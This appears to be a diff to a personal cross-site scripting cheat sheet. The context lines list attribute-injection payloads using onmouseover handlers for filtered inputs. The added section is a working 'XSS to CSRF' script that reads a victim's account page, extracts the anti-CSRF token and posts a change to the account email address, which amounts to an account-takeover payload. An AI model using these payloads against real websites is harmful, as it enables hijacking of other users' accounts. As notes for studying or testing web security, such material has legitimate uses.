@@ -13,3 +13,18 @@ but filters http/https:
 123" onmouseover="alert(document.domain);                     when < and > are encoded as &lt and &gt use this payload
 a onmouseover=alert(document.domain);                         when the server side escapes quotes 
 use a acnein to check whether additional attributes can be added.
+
+
+XSS to CSRF --- 
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
